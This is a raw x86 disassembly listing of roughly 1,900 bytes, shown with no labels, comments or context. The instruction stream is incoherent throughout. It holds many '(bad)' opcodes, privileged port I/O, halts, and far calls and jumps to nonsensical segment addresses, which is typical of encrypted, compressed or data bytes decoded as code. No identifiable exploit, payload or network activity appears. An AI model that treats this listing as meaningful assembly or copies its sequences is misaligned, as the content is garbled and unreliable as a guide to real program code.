  40cb3a:	dec    ebp
  40cb3b:	nop
  40cb3c:	xchg   ecx,eax
  40cb3d:	pop    ecx
  40cb3e:	mov    cl,0xf5
  40cb40:	ins    BYTE PTR es:[edi],dx
  40cb41:	sbb    al,0x2d
  40cb43:	aad    0x21
  40cb45:	jmp    0xd5a05de3
  40cb4a:	mov    dl,0xd5
  40cb4c:	jae    0x40cb77
  40cb4e:	cs test al,0x19
  40cb51:	xor    dh,bh
  40cb53:	mov    dl,0x4a
  40cb55:	mov    eax,0x76d7c0ab
  40cb5a:	adc    esp,DWORD PTR [eax]
  40cb5c:	or     ch,cl
  40cb5e:	cmp    BYTE PTR [esi],dh
  40cb60:	(bad)  
  40cb61:	cdq    
  40cb62:	and    al,0x3d
  40cb64:	add    al,0xe7
  40cb66:	pop    ebp
  40cb67:	push   edi
  40cb68:	fcomp  DWORD PTR [esi]
  40cb6a:	jbe    0x40cb4b
  40cb6c:	ins    DWORD PTR es:[edi],dx
  40cb6d:	imul   ebx,DWORD PTR [edx],0xffffff96
  40cb70:	push   ebp
  40cb71:	pop    ecx
  40cb72:	adc    eax,DWORD PTR [ebx+0x45]
  40cb75:	mov    edi,0x671099f5
  40cb7a:	push   esi
  40cb7b:	cmp    BYTE PTR [edx-0x6d1cc949],ah
  40cb81:	sbb    ebp,DWORD PTR [ebx+esi*8+0x13f206b6]
  40cb88:	push   ebx
  40cb89:	push   ebx
  40cb8a:	push   esi
  40cb8b:	push   ebx
  40cb8c:	out    0xfa,eax
  40cb8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb8f:	jne    0x40cb37
  40cb91:	dec    edi
  40cb92:	mov    esi,0x4aa8b6fa
  40cb97:	or     DWORD PTR [eax+0x629e1dfd],edx
  40cb9d:	jp     0x40cbfe
  40cb9f:	mov    dh,bl
  40cba1:	loopne 0x40cb9e
  40cba3:	or     BYTE PTR [eax+0x51],ah
  40cba6:	sbb    eax,0x2181dbe
  40cbab:	dec    esi
  40cbac:	pop    esp
  40cbad:	mov    bh,0x10
  40cbaf:	cmp    ebx,ecx
  40cbb1:	iret   
  40cbb2:	pushf  
  40cbb3:	dec    esp
  40cbb4:	dec    edx
  40cbb5:	pop    eax
  40cbb6:	ficomp DWORD PTR [eax]
  40cbb8:	mov    edx,0xf045a435
  40cbbd:	call   0x63a7:0x28ce4670
  40cbc4:	inc    ebx
  40cbc5:	fdivr  DWORD PTR [ecx-0xdef89df]
  40cbcb:	inc    eax
  40cbcc:	jno    0x40cbbc
  40cbce:	add    eax,0xd79fc142
  40cbd3:	imul   ecx,DWORD PTR [bx+di+0x27],0xc05aec75
  40cbdb:	add    edx,esp
  40cbdd:	in     al,dx
  40cbde:	mov    ah,0xeb
  40cbe0:	adc    ebx,ebp
  40cbe2:	aad    0xbb
  40cbe4:	push   DWORD PTR [edi-0x5e]
  40cbe7:	fst    QWORD PTR [eax+0x288cbfa4]
  40cbed:	mov    ds:0x758221d9,al
  40cbf2:	sub    edi,DWORD PTR [ebx+0x23f5a985]
  40cbf8:	rcl    BYTE PTR [edi+0x31fd276f],1
  40cbfe:	aaa    
  40cbff:	push   es
  40cc00:	pop    edi
  40cc01:	out    dx,eax
  40cc02:	push   ds
  40cc03:	inc    esp
  40cc04:	loop   0x40cc4c
  40cc06:	mov    ah,0xa0
  40cc08:	mov    ebx,0xd88099e8
  40cc0d:	inc    esi
  40cc0e:	jmp    0xb36f15df
  40cc13:	repz aad 0xfc
  40cc16:	jo     0x40cc20
  40cc18:	add    BYTE PTR [ebp+0xd],0xc1
  40cc1c:	rcr    DWORD PTR [ecx],0x9a
  40cc1f:	xchg   esp,eax
  40cc20:	sbb    al,dl
  40cc22:	pop    edi
  40cc23:	sbb    eax,0xa2dc4316
  40cc28:	inc    eax
  40cc29:	(bad)  [ebx+0x0]
  40cc2c:	ror    DWORD PTR [esp+edx*2-0x34cbf249],1
  40cc33:	and    ecx,DWORD PTR [ebx+ecx*4+0xc]
  40cc37:	jle    0xb86ea8db
  40cc3d:	mov    ecx,0x4a2a543a
  40cc42:	xor    dh,BYTE PTR [edx+0x1207e320]
  40cc48:	lods   al,BYTE PTR ds:[esi]
  40cc49:	arpl   WORD PTR [edi+0x555ba334],ax
  40cc4f:	dec    edx
  40cc50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc51:	mov    ecx,0xfdfb70b8
  40cc56:	ficomp WORD PTR [esi*1-0x78dbeba4]
  40cc5d:	fisubr WORD PTR ds:0x325c545b
  40cc63:	out    dx,eax
  40cc64:	rcr    BYTE PTR [ecx],1
  40cc66:	data16 loopne 0x40cc30
  40cc69:	int3   
  40cc6a:	aad    0x8b
  40cc6c:	inc    ecx
  40cc6d:	pop    esi
  40cc6e:	repnz cmp bh,BYTE PTR es:[esi-0x64d06087]
  40cc76:	adc    BYTE PTR [ebp-0x4bfc17cb],cl
  40cc7c:	cdq    
  40cc7d:	cmp    eax,0xb77b51b1
  40cc82:	loopne 0x40cc89
  40cc84:	adc    ax,0xf579
  40cc88:	sub    al,0x7c
  40cc8a:	sbb    eax,0x8cb6b7aa
  40cc8f:	sub    edi,DWORD PTR ds:0x2610b434
  40cc95:	push   esi
  40cc96:	cmp    esi,DWORD PTR [ebp+0x25]
  40cc99:	ret    
  40cc9a:	mov    esi,0xb167590e
  40cc9f:	jne    0x40cc5f
  40cca1:	dec    ebp
  40cca2:	cwde   
  40cca3:	xchg   edi,eax
  40cca4:	rcr    DWORD PTR [esi],0xab
  40cca7:	xchg   ebx,eax
  40cca8:	xor    al,BYTE PTR [eax+0x79]
  40ccab:	push   ds
  40ccac:	jl     0x40ccd2
  40ccae:	iret   
  40ccaf:	outs   dx,BYTE PTR ds:[esi]
  40ccb0:	cmp    BYTE PTR ds:0xab6935b3,dl
  40ccb6:	pop    esi
  40ccb7:	aad    0x59
  40ccb9:	hlt    
  40ccba:	(bad)  
  40ccbb:	push   ds
  40ccbc:	push   0xffffffe1
  40ccbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccbf:	pop    ebx
  40ccc0:	sub    DWORD PTR [esp+ebx*2+0x6f],0x30
  40ccc5:	pop    ds
  40ccc6:	jae    0x40ccae
  40ccc8:	shl    DWORD PTR [edi],1
  40ccca:	ins    DWORD PTR es:[edi],dx
  40cccb:	dec    ebp
  40cccc:	inc    eax
  40cccd:	xor    ch,dl
  40cccf:	out    0x82,al
  40ccd1:	push   ds
  40ccd2:	popa   
  40ccd3:	cmp    eax,0x27f5772f
  40ccd8:	inc    BYTE PTR ss:[edx]
  40ccdb:	jmp    0x4c34:0xf6b1449b
  40cce2:	mov    DWORD PTR [edx+eiz*4+0x75],ebp
  40cce6:	inc    edi
  40cce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cce8:	sti    
  40cce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccea:	inc    esp
  40cceb:	push   0x61c87902
  40ccf0:	jb     0x40ccf4
  40ccf2:	into   
  40ccf3:	imul   DWORD PTR ds:0x8ced6114
  40ccf9:	clc    
  40ccfa:	push   0x7ef0d2c3
  40ccff:	pop    ecx
  40cd00:	iret   
  40cd01:	pop    eax
  40cd02:	mov    esp,0xc25a04fd
  40cd07:	imul   ebp,ebx,0xfffffffa
  40cd0a:	jl     0x40cca7
  40cd0c:	jne    0x40cd0e
  40cd0e:	jb     0x40ccc8
  40cd10:	mov    BYTE PTR [ecx+0x5f4a8662],dl
  40cd16:	jbe    0x40cd83
  40cd18:	int3   
  40cd19:	push   ebx
  40cd1a:	lods   al,BYTE PTR ds:[esi]
  40cd1b:	popa   
  40cd1c:	nop
  40cd1d:	bound  eax,QWORD PTR [edi+0x3d]
  40cd20:	fcom   DWORD PTR [ecx-0x3f]
  40cd23:	gs dec edi
  40cd25:	pop    ecx
  40cd26:	call   DWORD PTR [eax]
  40cd28:	cs aaa 
  40cd2a:	in     eax,dx
  40cd2b:	mov    esp,0x3e9ac550
  40cd30:	jmp    0xad432283
  40cd35:	xlat   BYTE PTR ds:[ebx]
  40cd36:	xchg   ecx,eax
  40cd37:	fs pop esi
  40cd39:	sbb    esp,DWORD PTR [ebx+0xf]
  40cd3c:	aas    
  40cd3d:	fld    TBYTE PTR [ecx+0x16]
  40cd40:	fbld   TBYTE PTR [edx-0x24]
  40cd43:	ins    DWORD PTR es:[edi],dx
  40cd44:	imul   edx,DWORD PTR [ebp+0x5d5a783],0xffffffd6
  40cd4b:	xlat   BYTE PTR ds:[ebx]
  40cd4c:	adc    al,0x8a
  40cd4e:	mov    esp,ebp
  40cd50:	jmp    0x5512:0x5cdc38bc
  40cd57:	clc    
  40cd58:	and    DWORD PTR [ebx],0x24a1e0f7
  40cd5e:	inc    ebp
  40cd5f:	fld    DWORD PTR [eax+0x52c1e5ee]
  40cd65:	jmp    0xacea:0xab27863c
  40cd6c:	or     DWORD PTR [edi+esi*8],ebp
  40cd6f:	dec    ebx
  40cd70:	and    al,0x9f
  40cd72:	jbe    0x40cd1f
  40cd74:	shl    DWORD PTR [edx],0x7
  40cd77:	call   0xe06e:0x7e4acc2e
  40cd7e:	ret    0x57a4
  40cd81:	adc    dl,0xa5
  40cd84:	or     BYTE PTR [ebx+0x6c0c11ee],ch
  40cd8a:	push   cs
  40cd8b:	sub    al,0xb1
  40cd8d:	mov    edi,ss
  40cd8f:	jge    0x40cd66
  40cd91:	seto   ah
  40cd94:	mov    dh,0xb
  40cd96:	adc    DWORD PTR [edi-0x15311f42],ebx
  40cd9c:	fild   QWORD PTR ds:0xae68b761
  40cda2:	inc    ebp
  40cda3:	test   eax,0x6b0a0e23
  40cda8:	enter  0x392a,0x54
  40cdac:	(bad)  [ebx]
  40cdae:	mov    ah,0x8e
  40cdb0:	mov    ecx,DWORD PTR [edx+0x3]
  40cdb3:	and    bl,BYTE PTR [eax+0x64]
  40cdb6:	lods   eax,DWORD PTR ds:[esi]
  40cdb7:	loop   0x40ce18
  40cdb9:	push   ebp
  40cdba:	clc    
  40cdbb:	and    eax,0x5b08dade
  40cdc0:	imul   edi,DWORD PTR [edi],0xffffffd6
  40cdc3:	cmp    cl,BYTE PTR [ecx+0xb]
  40cdc6:	je     0x40cd4e
  40cdc8:	sbb    DWORD PTR [ebp-0x7],ebx
  40cdcb:	add    edx,edx
  40cdcd:	int    0xdf
  40cdcf:	xchg   edi,eax
  40cdd0:	pop    edx
  40cdd1:	sbb    esp,esi
  40cdd3:	push   cs
  40cdd4:	loopne 0x40cd7f
  40cdd6:	jnp    0x40cd72
  40cdd8:	xchg   ebx,eax
  40cdd9:	(bad)  
  40cdda:	inc    ah
  40cddc:	jb     0x40cd74
  40cdde:	jne    0x40cdb7
  40cde0:	icebp  
  40cde1:	fs addr16 test al,0xd3
  40cde5:	and    BYTE PTR [esi+0x6243bc86],0x68
  40cdec:	jl     0x40cda2
  40cdee:	outs   dx,DWORD PTR ds:[esi]
  40cdef:	into   
  40cdf0:	or     al,BYTE PTR [ecx+0x3d]
  40cdf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdf4:	ror    eax,0xf5
  40cdf7:	and    BYTE PTR [ecx-0x46],dl
  40cdfa:	pop    ebp
  40cdfb:	mov    edx,0xe754c7a6
  40ce00:	add    esi,DWORD PTR ss:[ebp-0x73935160]
  40ce07:	loope  0x40ce04
  40ce09:	sbb    eax,0x514c9053
  40ce0e:	push   es
  40ce0f:	lahf   
  40ce10:	imul   edi,DWORD PTR [edx],0x5
  40ce13:	mov    esi,0xab1fde3e
  40ce18:	dec    BYTE PTR es:[ebx-0x7da1c8dc]
  40ce1f:	stc    
  40ce20:	mov    ds:0x6b03e9f6,eax
  40ce25:	cmp    DWORD PTR [edi+esi*1-0x1e33abb3],eax
  40ce2c:	sbb    eax,0x8f64980d
  40ce31:	or     dl,BYTE PTR [esi+0x33]
  40ce34:	cmc    
  40ce35:	shl    DWORD PTR [ebp+0x17],1
  40ce38:	add    BYTE PTR [ebx],bh
  40ce3a:	mov    WORD PTR [edi-0x4d],ss
  40ce3d:	into   
  40ce3e:	cld    
  40ce3f:	and    ebp,DWORD PTR ds:0xc371f009
  40ce45:	test   DWORD PTR [ecx+0x7f2f6296],ebx
  40ce4b:	cs sbb eax,0x896ab6c6
  40ce51:	leave  
  40ce52:	jno    0x40cebc
  40ce54:	and    eax,0x8595d945
  40ce59:	inc    esi
  40ce5a:	sbb    BYTE PTR [ebp-0x3],dh
  40ce5d:	pushf  
  40ce5e:	rcl    DWORD PTR [ebx],1
  40ce60:	mov    dl,0x6c
  40ce62:	dec    esp
  40ce63:	test   DWORD PTR [esi+0x61],edi
  40ce66:	shr    BYTE PTR [edx],cl
  40ce68:	iret   
  40ce69:	pop    ebp
  40ce6a:	push   ecx
  40ce6b:	rep ins BYTE PTR es:[edi],dx
  40ce6d:	pop    edx
  40ce6e:	inc    edx
  40ce6f:	fsqrt  
  40ce71:	jae    0x40ce6c
  40ce73:	dec    edx
  40ce74:	int    0x9
  40ce76:	pop    esp
  40ce77:	test   DWORD PTR [edi+0x24],edi
  40ce7a:	cmp    BYTE PTR [ebp+0xd5a94e8],ch
  40ce80:	stos   DWORD PTR es:[edi],eax
  40ce81:	clc    
  40ce82:	test   eax,0xaca46cea
  40ce87:	(bad)  
  40ce88:	xlat   BYTE PTR ds:[ebx]
  40ce89:	push   ebx
  40ce8a:	outs   dx,DWORD PTR ds:[esi]
  40ce8b:	pavgw  mm7,QWORD PTR [edx+0x29]
  40ce8f:	ss out 0xff,al
  40ce92:	and    bh,BYTE PTR [eax+0x6932b1f1]
  40ce98:	and    bh,ch
  40ce9a:	enter  0xe293,0x0
  40ce9e:	cmp    eax,0x8b92c134
  40cea3:	out    dx,eax
  40cea4:	hlt    
  40cea5:	shr    BYTE PTR [esi-0x17],0xe3
  40cea9:	bswap  esi
  40ceab:	retf   
  40ceac:	out    0x70,al
  40ceae:	jo     0x40ce42
  40ceb0:	test   BYTE PTR [edx-0xcc38b80],bh
  40ceb6:	sub    BYTE PTR [ebp+0x32],0xcf
  40ceba:	in     eax,dx
  40cebb:	popa   
  40cebc:	or     eax,0xb7e0ea20
  40cec1:	sbb    dl,BYTE PTR [esi]
  40cec3:	sbb    bl,dh
  40cec5:	icebp  
  40cec6:	or     DWORD PTR [ebx+0x4acc6c1d],eax
  40cecc:	popf   
  40cecd:	test   edx,eax
  40cecf:	jg     0x40cea3
  40ced1:	sub    BYTE PTR [ebx-0x7d7d5a8b],dl
  40ced7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ced8:	push   esp
  40ced9:	mov    dh,0xc7
  40cedb:	or     edi,edx
  40cedd:	neg    esp
  40cedf:	jmp    0x40cf03
  40cee1:	mov    ds:0x827f3fe0,eax
  40cee6:	ins    BYTE PTR es:[edi],dx
  40cee7:	xor    bl,BYTE PTR [ecx-0x1b7f5575]
  40ceed:	fimul  WORD PTR [esi-0x49]
  40cef0:	addr16 jno 0x40ce9a
  40cef3:	lock dec edi
  40cef5:	dec    edi
  40cef6:	inc    ecx
  40cef7:	fdivr  QWORD PTR [ebp-0x6c1fc6b6]
  40cefd:	mov    WORD PTR [edi-0x56],?
  40cf00:	pop    esi
  40cf01:	mov    dh,0xfb
  40cf03:	shr    DWORD PTR [ecx+0x44],0x9d
  40cf07:	xor    BYTE PTR [ecx*1-0x39bb75d7],al
  40cf0e:	imul   ebx,DWORD PTR [esp+ebp*1],0x78
  40cf12:	shl    BYTE PTR [edx+0x4f98acdf],cl
  40cf18:	adc    BYTE PTR [edi-0x6e],cl
  40cf1b:	aaa    
  40cf1c:	nop
  40cf1d:	addr16 popf 
  40cf1f:	loope  0x40cf0d
  40cf21:	xor    BYTE PTR [edx-0x36],ch
  40cf24:	ret    
  40cf25:	in     eax,0x29
  40cf27:	hlt    
  40cf28:	and    ebp,esi
  40cf2a:	aas    
  40cf2b:	sbb    dh,al
  40cf2d:	push   cs
  40cf2e:	out    dx,al
  40cf2f:	add    DWORD PTR [esi-0x30],edx
  40cf32:	jmp    0x884ff610
  40cf37:	add    bl,bh
  40cf39:	sti    
  40cf3a:	(bad)
  40cf3e:	xor    DWORD PTR [edi+ecx*1-0xd],0x8f2fb57f
  40cf46:	adc    eax,0xb05ac68a
  40cf4b:	scas   al,BYTE PTR es:[edi]
  40cf4c:	sub    eax,0x94be9e29
  40cf51:	fsub   QWORD PTR [edx-0x26]
  40cf54:	push   edx
  40cf55:	ror    DWORD PTR [edi],1
  40cf57:	les    ecx,FWORD PTR [ebp+0x5]
  40cf5a:	aas    
  40cf5b:	pop    ebp
  40cf5c:	add    al,0xcf
  40cf5e:	mov    edi,0x988b5800
  40cf63:	fwait
  40cf64:	push   0x11406772
  40cf69:	xor    edx,DWORD PTR [ecx-0x42f36b20]
  40cf6f:	and    eax,0x680b75c
  40cf74:	call   FWORD PTR [eax+0x6ae8e950]
  40cf7a:	outs   dx,DWORD PTR ds:[esi]
  40cf7b:	and    edx,edi
  40cf7d:	mov    ds:0xaabf5153,eax
  40cf82:	push   ebx
  40cf83:	add    ah,BYTE PTR [esi-0x1f2712d5]
  40cf89:	sub    eax,0x243f47ec
  40cf8e:	aaa    
  40cf8f:	ins    DWORD PTR es:[edi],dx
  40cf90:	xlat   BYTE PTR ss:[ebx]
  40cf92:	xchg   edx,eax
  40cf93:	loop   0x40cfec
  40cf95:	jbe    0x40cf40
  40cf97:	lods   eax,DWORD PTR ds:[esi]
  40cf98:	adc    ecx,DWORD PTR [eax+0x3d7196c6]
  40cf9e:	sbb    esp,DWORD PTR [ecx-0x42]
  40cfa1:	in     al,0x1b
  40cfa3:	cmc    
  40cfa4:	imul   esp,DWORD PTR [esi-0x34],0x3d
  40cfa8:	xchg   esi,eax
  40cfa9:	inc    esp
  40cfaa:	int3   
  40cfab:	mov    bl,0xbf
  40cfad:	iret   
  40cfae:	fwait
  40cfaf:	lock or BYTE PTR ds:0x6ba5cfe9,al
  40cfb6:	add    ebx,esi
  40cfb8:	sub    BYTE PTR [ebp*1+0x726101bc],0x39
  40cfc0:	repnz pop eax
  40cfc2:	dec    ebx
  40cfc3:	mov    ch,0x67
  40cfc5:	stc    
  40cfc6:	loope  0x40cf8a
  40cfc8:	imul   eax,DWORD PTR [ebx-0x716e9ad8],0xffffffa7
  40cfcf:	mov    DWORD PTR [ecx],ecx
  40cfd1:	pop    ds
  40cfd2:	icebp  
  40cfd3:	je     0x40cf7c
  40cfd5:	pop    DWORD PTR [ebx-0x3721781d]
  40cfdb:	ins    DWORD PTR es:[edi],dx
  40cfdc:	pop    edi
  40cfdd:	mov    gs,WORD PTR [ecx+0x2a]
  40cfe0:	(bad)
  40cfe4:	sbb    BYTE PTR [esi+0x6ff167ee],0x6f
  40cfeb:	mov    eax,0x2bbed29f
  40cff0:	add    ah,BYTE PTR [esi]
  40cff2:	cdq    
  40cff3:	sbb    al,0x1f
  40cff5:	aaa    
  40cff6:	adc    al,0xb6
  40cff8:	sub    BYTE PTR [ebp-0x15],ch
  40cffb:	outs   dx,BYTE PTR ds:[esi]
  40cffc:	inc    ecx
  40cffd:	dec    ecx
  40cffe:	jnp    0x8110b49c
  40d004:	or     bh,BYTE PTR [ebp-0x3a21e660]
  40d00a:	shr    DWORD PTR [edi-0x2b],0xe5
  40d00e:	fst    QWORD PTR [edi-0x5b]
  40d011:	sahf   
  40d012:	jnp    0x40d07c
  40d014:	pop    es
  40d015:	fistp  QWORD PTR [edx+0x377f23bb]
  40d01b:	sbb    dh,BYTE PTR [edi-0x33bebe97]
  40d021:	mov    cl,0x4
  40d023:	sub    BYTE PTR [ebp+ecx*4+0x3c872fa8],cl
  40d02a:	fsubr  st(4),st
  40d02c:	es call 0xa10e:0x7476fc91
  40d034:	inc    eax
  40d035:	(bad)  [eax+0x76]
  40d038:	out    0xf6,al
  40d03a:	imul   edx,edi,0x79
  40d03d:	sbb    al,0xad
  40d03f:	pusha  
  40d040:	sub    BYTE PTR es:[edx+0x13],ah
  40d044:	and    BYTE PTR [ebp+eax*4+0x2d],ch
  40d048:	fadd   DWORD PTR ds:0xa38a22dc
  40d04e:	cmc    
  40d04f:	imul   ecx,DWORD PTR [edx+edi*4],0xfffffff0
  40d053:	mov    cl,0xa2
  40d055:	adc    DWORD PTR [edx+eiz*8-0x46187f5],edx
  40d05c:	(bad)  
  40d05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d05f:	mov    bh,BYTE PTR [edx+0x53]
  40d062:	mov    WORD PTR [ebx+0x2688394b],ss
  40d068:	add    bl,bl
  40d06a:	stos   BYTE PTR es:[edi],al
  40d06b:	out    0x89,eax
  40d06d:	jmp    0x40d02f
  40d06f:	xchg   edi,eax
  40d070:	rol    ch,cl
  40d072:	dec    eax
  40d073:	iret   
  40d074:	push   ds
  40d075:	xor    eax,0x425c5818
  40d07a:	mov    edx,0xc39e573a
  40d07f:	or     eax,esi
  40d081:	ret    0xe651
  40d084:	push   0xffffffdc
  40d086:	imul   ebx,edx,0x4045012a
  40d08c:	sub    BYTE PTR [ebp-0x16018688],al
  40d092:	repnz stc 
  40d094:	jle    0x40d02d
  40d096:	jne    0x40d0bf
  40d098:	mov    edx,0x3f0abf3
  40d09d:	imul   esi,DWORD PTR [ebx],0xffffffea
  40d0a0:	dec    esp
  40d0a1:	call   0xaa0d2fbf
  40d0a6:	cld    
  40d0a7:	adc    esi,DWORD PTR [ecx-0x66092c0d]
  40d0ad:	dec    edx
  40d0ae:	out    0x87,eax
  40d0b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0b1:	dec    eax
  40d0b2:	dec    esp
  40d0b3:	jo     0x40d0f0
  40d0b5:	jl     0x40d045
  40d0b7:	mov    ax,WORD PTR [edx-0x43]
  40d0bb:	lea    edi,[edi+edi*1-0x93a82e3]
  40d0c2:	push   ebx
  40d0c3:	cmc    
  40d0c4:	mov    dl,BYTE PTR [eax+0x6fed1e65]
  40d0ca:	out    0x12,eax
  40d0cc:	scas   eax,DWORD PTR es:[edi]
  40d0cd:	mov    ebx,0x2c26f513
  40d0d2:	(bad)  
  40d0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0d4:	xchg   ebp,eax
  40d0d5:	inc    ebx
  40d0d6:	(bad)  
  40d0d7:	clc    
  40d0d8:	push   0xf8691961
  40d0dd:	imul   esi,DWORD PTR [ebx],0xc238ea73
  40d0e3:	add    al,0xd1
  40d0e5:	or     DWORD PTR [eax+0x1e],edx
  40d0e8:	push   0x4
  40d0ea:	push   ds
  40d0eb:	push   ss
  40d0ec:	lea    ebp,[ecx]
  40d0ee:	push   eax
  40d0ef:	mov    bl,0x34
  40d0f1:	jmp    0x40d08e
  40d0f3:	fnstsw WORD PTR [edi]
  40d0f5:	mov    dh,0xf8
  40d0f7:	pop    ds
  40d0f8:	mov    al,ds:0x45bf5ad4
  40d0fd:	repz fdivr DWORD PTR [esi-0x1a7743df]
  40d104:	shr    al,0xf1
  40d107:	and    al,0x34
  40d109:	jmp    0x89c2:0xc093fcee
  40d110:	jle    0x40d0ca
  40d112:	aad    0x75
  40d114:	sbb    eax,0x480dfae0
  40d119:	adc    al,0x13
  40d11b:	push   edx
  40d11c:	fmul   st(2),st
  40d11e:	jno    0x40d107
  40d120:	sub    eax,0x93e18ba8
  40d125:	retf   0x6a28
  40d128:	jne    0x40d16b
  40d12a:	std    
  40d12b:	mov    dh,0xe0
  40d12d:	jb     0x40d1ab
  40d12f:	(bad)  
  40d130:	xor    eax,0x2694c026
  40d135:	adc    cl,BYTE PTR es:[edx+0x3b89a16e]
  40d13c:	cmp    al,0x72
  40d13e:	pop    esi
  40d13f:	test   dl,ah
  40d141:	ret    0x95de
  40d144:	cmp    al,0x2b
  40d146:	mov    edi,0x7c450a9b
  40d14b:	popa   
  40d14c:	push   0x4e7b95ec
  40d151:	push   esp
  40d152:	(bad)  
  40d154:	sbb    ch,BYTE PTR [ebx]
  40d156:	(bad)  
  40d157:	inc    BYTE PTR [ecx]
  40d159:	push   cs
  40d15a:	jge    0x40d17d
  40d15c:	dec    eax
  40d15d:	shr    edx,1
  40d15f:	cli    
  40d160:	adc    eax,0xf8785b50
  40d165:	mov    ds:0x3cf1c497,al
  40d16a:	jae    0x40d17f
  40d16c:	pop    ss
  40d16d:	inc    edi
  40d16e:	fcmovnb st,st(1)
  40d170:	cli    
  40d171:	or     al,0xc9
  40d173:	cmp    eax,0xa3e55f00
  40d178:	in     eax,dx
  40d179:	fstp   DWORD PTR [edi-0x4c]
  40d17c:	sbb    cl,BYTE PTR [ebx+0x71]
  40d17f:	loopne 0x40d1e2
  40d181:	call   0x3c0df782
  40d186:	lea    edi,es:0xccc142a4
  40d18d:	inc    ebp
  40d18e:	jge    0x40d126
  40d190:	leave  
  40d191:	shl    ebx,0x7f
  40d194:	nop
  40d195:	mov    edi,0x8124db6b
  40d19a:	(bad)  
  40d19b:	int3   
  40d19c:	not    DWORD PTR [ebp+0x33afc03c]
  40d1a2:	ftst   
  40d1a4:	mov    esi,0xa96dbfc
  40d1a9:	pop    eax
  40d1aa:	inc    ebp
  40d1ab:	sub    dl,bh
  40d1ad:	ja     0x40d218
  40d1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1b0:	mov    ecx,0xa6c34db1
  40d1b5:	imul   ebp,DWORD PTR [esi-0x26b6fefc],0x68
  40d1bc:	icebp  
  40d1bd:	fwait
  40d1be:	ds stos DWORD PTR es:[edi],eax
  40d1c0:	pop    ebx
  40d1c1:	cli    
  40d1c2:	aas    
  40d1c3:	mov    eax,0x8f382806
  40d1c8:	ins    DWORD PTR es:[edi],dx
  40d1c9:	lock add al,0x46
  40d1cc:	leave  
  40d1cd:	rcl    BYTE PTR [edi+0x7eff4727],0xca
  40d1d4:	dec    edx
  40d1d5:	fild   WORD PTR [edx+0x16b14598]
  40d1db:	scas   al,BYTE PTR es:[edi]
  40d1dc:	fcom   QWORD PTR [eax]
  40d1de:	inc    edi
  40d1df:	js     0x40d250
  40d1e1:	push   edi
  40d1e2:	sbb    eax,0x5e376deb
  40d1e7:	mov    ch,0xda
  40d1e9:	sbb    ah,BYTE PTR [ecx]
  40d1eb:	adc    DWORD PTR [edx*8+0x56469827],esp
  40d1f2:	mov    ds:0x76620c97,al
  40d1f7:	div    BYTE PTR [ecx-0x49]
  40d1fa:	arpl   WORD PTR [ecx],cx
  40d1fc:	in     eax,dx
  40d1fd:	pushf  
  40d1fe:	jmp    0x5a85:0x990b6e8
  40d205:	pop    ecx
  40d206:	in     eax,0xa5
  40d208:	jp     0x40d24c
  40d20a:	ins    DWORD PTR es:[edi],dx
  40d20b:	lods   al,BYTE PTR ds:[esi]
  40d20c:	mov    bl,0xa1
  40d20e:	adc    ecx,DWORD PTR [eax+eax*2+0x6a01f49a]
  40d215:	fild   DWORD PTR [esi+ebp*4-0x204c6c1d]
  40d21c:	pushf  
  40d21d:	add    BYTE PTR [edx-0x7b0c5dcc],ch
  40d223:	mov    esp,DWORD PTR [ebx-0x8a347fd]
  40d229:	fisttp WORD PTR [esi+0x3b1cb868]
  40d22f:	std    
  40d230:	aad    0x66
  40d232:	sub    al,0x59
  40d234:	inc    edx
  40d235:	fdiv   QWORD PTR [esi-0x3a]
  40d238:	mov    eax,ds:0xe27617e4
  40d23d:	inc    ebx
  40d23e:	push   ds
  40d23f:	adc    ebx,DWORD PTR [esi-0x7b]
  40d242:	jl     0x40d1cf
  40d244:	mov    ebp,0x8d36d698
  40d249:	call   0xbaa8:0xaab2b448
  40d250:	mov    esi,0x79a35369
  40d255:	sti    
  40d256:	xor    BYTE PTR [edi-0x1fde287b],ah
  40d25c:	gs inc edx
  40d25e:	in     eax,dx
  40d25f:	mov    DWORD PTR [esp+eiz*2-0x4e],ebx
  40d263:	and    al,0x76
  40d265:	inc    ebp
  40d266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d267:	inc    eax
  40d268:	add    eax,esp
  40d26a:	(bad)  
  40d26b:	lods   eax,DWORD PTR ds:[esi]
  40d26c:	ins    BYTE PTR es:[edi],dx
  40d26d:	adc    al,0x2e
  40d26f:	dec    ecx
  40d270:	stos   BYTE PTR es:[edi],al
  40d271:	jmp    0x40d287
  40d273:	sahf   
  40d274:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40d276:	mov    ds:0xed9015af,al
  40d27b:	and    eax,0xb40d2b51
  40d280:	jnp    0x40d259
  40d282:	(bad)  
  40d284:	cld    
  40d285:	inc    ebp
  40d286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d287:	xor    BYTE PTR [edi],bh
  40d289:	pop    es
  40d28a:	sub    al,BYTE PTR [eax]
  40d28c:	sbb    al,0xde
  40d28e:	adc    eax,0x31133333
  40d293:	mov    esp,0x2da7a028
  40d298:	ss pop es
  40d29a:	loope  0x40d2c9
  40d29c:	fcmovnu st,st(6)
  40d29e:	jnp    0x40d2da
  40d2a0:	stos   BYTE PTR es:[edi],al
  40d2a1:	fsubr  QWORD PTR [ecx-0x27]
  40d2a4:	inc    esp
  40d2a5:	stc    
  40d2a6:	mov    dl,0xfb
  40d2a8:	cmp    DWORD PTR [esp+eiz*4-0x5d76293a],0xfcca38ac
  40d2b3:	jle    0x40d25a
  40d2b5:	xor    BYTE PTR [ebx],ch
  40d2b7:	or     al,0x9c
  40d2b9:	mov    ebp,esi
  40d2bb:	scas   eax,DWORD PTR es:[edi]
  40d2bc:	xchg   ecx,eax
  40d2bd:	lock es sahf 
  40d2c0:	gs push ebp
  40d2c3:	loop   0x40d251
  40d2c5:	(bad)  [eax]
  40d2c7:	dec    ebp
  40d2c8:	test   al,0xcf
